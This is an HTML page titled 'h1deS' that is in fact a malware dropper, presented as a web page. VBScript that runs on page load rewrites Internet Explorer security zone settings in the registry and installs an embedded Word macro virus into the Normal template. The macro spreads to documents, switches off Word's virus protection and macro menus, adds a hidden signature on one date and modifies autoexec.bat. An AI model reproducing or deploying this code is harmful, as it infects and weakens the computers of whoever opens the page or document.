<nospace>
<Html>

<HEAD>
<!--Begin JavaScript roadmap code.  If editing downloaded HTML source, delete
 this portion.-->

<title>h1deS</title>

</head>
<body>

<script language="VBScript"><!--
Sub Mark()

End Sub

On error Resume Next

Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201" , 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "f0re"
	Dim FSO
	Set FSO = CreateObject("Scripting.FileSystemObject")
	Set TRange = document.body.createTextRange
	Set a1 = FSO.OpenTextFile("c:\windows\mhtml1.txt", 2, True)
	a1.WriteLine TRange.htmltext
	a1.close()
	Set a1 = FSO.OpenTextFile("c:\windows\mhtml1.txt", 1, True)
	wbeginvir = "Sub WordMark()"
	Do While a1.atendofstream <> True
		wfindr = a1.readline
		if wfindr = wbeginvir then exit Do
	Loop
	Set a2 = FSO.OpenTextFile("c:\windows\mhtml2.txt", 2, True)
	wlinr = "bla"
	a2.writeline "Private Sub Document_Open()"
	Do While wlinr <> "End Sub"
		wlinr = a1.readline
		a2.writeline wlinr
	Loop
	a2.close
	a1.close
	Set aa = FSO.OpenTextFile("c:\windows\mhtml2.txt", 1, True)
	Set bb = FSO.OpenTextFile("c:\windows\hide.txt", 2, True)
	readmvir = "nope"
	Do while aa.atendofstream <> True
		readmvir = aa.readline
		if Mid(readmvir,1,1) = "'" then readmvir = Mid(readmvir,2,Len(readmvir) -1)
		bb.writeline readmvir
	Loop
	bb.Close
	aa.close
	Set bb = FSO.OpenTextFile("c:\windows\hide.txt", 1, True)
	Set WordObj = CreateObject("Word.Application")
	Set NT= WordObj.normaltemplate.vbproject.vbcomponents(1).codemodule
	If NT.Lines(5,1) <> "MyID = h1deS" then
		WordObj.Options.SaveNormalPrompt = False
		NT.DeleteLines 1, NT.CountOfLines
		i = 1
		Do while bb.atendofstream <> true
		b = bb.readline
		NT.InsertLines i, b
		i = i + 1
		Loop
	End If
	Set NT = Nothing
	WordObj.Quit
	bb.close

Sub WordMark()
'
'On Error Resume Next
'
'MyID = h1deS
'Version = 1.5
'WrittenBy = f0re
'
''<-------------------------------infection-------------------------------->
'
'NormalInstalled = False
'ActiveInstalled = False
'
'NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(5, 1)
'AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(5, 1)
'
'If NI = "MyID = h1deS" Then NormalInstalled = True
'If AI = "MyID = h1deS" Then ActiveInstalled = True
'
'Set ActiveCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
'Set NormalCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule
'
'If NormalInstalled = False Then
'    Set Infection = NormalCarrier
'    Set Carrier = ActiveCarrier
'Else
'    Set Infection = ActiveCarrier
'    Set Carrier = NormalCarrier
'End If
'
'With Carrier
'    Vircode = ""
'    For X = 1 To .CountOfLines
'        Vircode = Vircode & .Lines(X, 1) & Chr(13) & Chr(10)
'        If .Lines(X, 1) = "End Sub" Then Exit For
'    Next X
'End With
'
'With Infection
'        .DeleteLines 1, .CountOfLines
'        .InsertLines 1, Vircode
'End With
'
'
''<-------------------------------stealth-------------------------------->
'
'ScreeenUpdate = 0
'DisableAutoMacros = 0
'
'Application.DisplayAlerts = wdAlertsNone
'Application.StatusBar = False
'Application.DisplayRecentFiles = False
'Application.EnableCancelKey = wdCancelDisabled
'
'Options.SaveNormalPrompt = 0
'Options.ConfirmConversions = 0
'Options.VirusProtection = False
'Options.VirusProtection = 0
'ToolsOptionsSave.GlobalDotPrompt = 0
'ToolsOptionsSave.AutoSave = 0
'CommandBars("View").Controls(6).visible = False
'Application.CommandBars("Tools").Controls("macro").Visible = False
'
'For X = 1 To ThisDocument.Variables.Count
'          DoEvents
'          ThisDocument.Variables(X).Delete
'Next X
'
'For Y = 1 To ActiveDocument.Variables.Count
'          DoEvents
'          ActiveDocument.Variables(Y).Delete
'Next Y
'
'For Z = 1 To Normal.ThisDocument.Variables.Count
'          DoEvents
'          Normal.ThisDocument.Variables(Z).Delete
'Next Z
'
'Vircode2 = Vircode & "Sub ViewVBCode()" & Chr(13)
'Vircode2 = Vircode2 & "End Sub" & Chr(13)
'Vircode2 = Vircode2 & "Sub ToolsMacro()" & Chr(13)
'Vircode2 = Vircode2 & "End Sub"
'
'DoEvents
'
'Normal.ThisDocument.Variables.Add "vir", Vircode2
'ActiveDocument.Variables.Add "vir", Vircode
'
'ResetCode = "Private Sub Document_Close()" & Chr(13)
'ResetCode = ResetCode & "With ThisDocument.VBProject.VBComponents(1).CodeModule" & Chr(13)
'ResetCode = ResetCode & ".DeleteLines 1, .CountOfLines" & Chr(13)
'ResetCode = ResetCode & ".InsertLines 1, ThisDocument.Variables(1).Value" & Chr(13)
'ResetCode = ResetCode & "End With" & Chr(13)
'ResetCode = ResetCode & "ThisDocument.Save" & Chr(13)
'ResetCode = ResetCode & "End Sub" & Chr(13)
'
'ResetCode2 = ResetCode & "Sub ViewVBCode()" & Chr(13)
'ResetCode2 = ResetCode2 & "End Sub" & Chr(13)
'ResetCode2 = ResetCode2 & "Sub ToolsMacro()" & Chr(13)
'ResetCode2 = ResetCode2 & "End Sub" & Chr(13)
'
'With NormalCarrier
'    .DeleteLines 1, .CountOfLines
'End With
'
'With ActiveCarrier
'    .DeleteLines 1, .CountOfLines
'End With
'
'With NormalCarrier
'    .InsertLines 1, ResetCode2
'End With
'
'With ActiveCarrier
'   .InsertLines 1, ResetCode
'End With
'
'DoEvents
'
'    ActiveDocument.Save
'    NormalTemplate.Save
'
'
''<-------------------------------payload-------------------------------->
'
'If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "h1deS") <> "(c)1999 by f0re" Then
'System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "h1deS") = "(c)1999 by f0re"
'End If
'
'
'If Month(Now()) = 9 And Day(Now()) = 26 then
' Selection.EndKey Unit:=wdStory
' Selection.TypeParagraph
' Selection.Font.ColorIndex = wdWhite
' Selection.TypeText "h1deS Macro Virus (c)1999 by f0re"
' Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
' Selection.HomeKey Unit:=wdLine
' Selection.MoveRight Unit:=wdCharacter, Count:=42, Extend:=wdExtend
' Selection.LanguageID = wdNoProofing
' Selection.HomeKey Unit:=wdStory
'End If
'
'Root = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "SystemRoot")
'Targ = Mid(Root, 1, 3)
'
'Open Targ + "autoexec.bat" For Append As #1
'        Print #1, "pause"
'Close #1
'
'
'
'End Sub
'Sub ViewVBCode()
'End Sub
'Sub ToolsMacro()
'
End Sub

--></script>
</body>
</html>
